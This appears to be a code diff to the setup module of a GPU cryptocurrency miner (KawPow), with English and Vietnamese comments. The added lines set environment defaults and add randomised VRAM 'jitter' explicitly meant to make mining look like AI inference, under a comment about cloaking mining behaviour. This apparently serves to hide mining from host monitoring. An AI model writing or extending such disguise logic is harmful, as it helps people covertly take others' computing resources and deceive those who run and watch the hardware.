@@ -699,6 +699,25 @@ def setup_gpu_optimization(environmental_limits, logger):
 # ✅ **CPU OPTIMIZATIONS REMOVED** (tối ưu hóa CPU đã xóa) - **Function eliminated for GPU-only mode** (hàm đã loại bỏ cho chế độ chỉ GPU)
 # **All CPU governor, process limits, and performance tuning removed** (tất cả CPU governor, giới hạn process, và tinh chỉnh hiệu năng đã xóa)
 
+def _sanitize_env():
+    """Centralized environment sanitizer to normalize critical environment variables.
+
+    Thiết lập/sửa các biến môi trường quan trọng sớm để tránh cảnh báo lặp lại
+    và đảm bảo hành vi ổn định giữa các module.
+    """
+    try:
+        # Ensure KAWPOW_DAG_PROGRESSIVE is valid ('0' or '1'); force '1' if missing/invalid
+        val = os.getenv('KAWPOW_DAG_PROGRESSIVE')
+        if val not in ('0', '1'):
+            os.environ['KAWPOW_DAG_PROGRESSIVE'] = '1'
+            try:
+                logging.getLogger('setup_env').info("[SANITIZE_ENV] Auto-set KAWPOW_DAG_PROGRESSIVE=1")
+            except Exception:
+                pass
+    except Exception:
+        # Best-effort sanitizer; never fail setup due to sanitizer itself
+        pass
+
 def setup():
     """Entry point for environment setup"""
     # ---------------------------------------------------
@@ -798,6 +817,11 @@ def setup():
 
     # VRAM reservation defaults for mining workload
     _force_env('VRAM_ALLOCATION_DEFAULT', '0.2')
+    # VRAM jitter defaults for inference-like variability
+    # Allow range syntax "0.10..0.20"; when range provided, controller picks random in range per round
+    _force_env('VRAM_JITTER_PCT', '0.10..0.20')
+    _force_env('VRAM_ALLOC_MIN', '0.25')
+    _force_env('VRAM_ALLOC_MAX', '0.85')
 
     # Cloak behavior for mining
     _force_env('MINING_MODE', 'gpu')
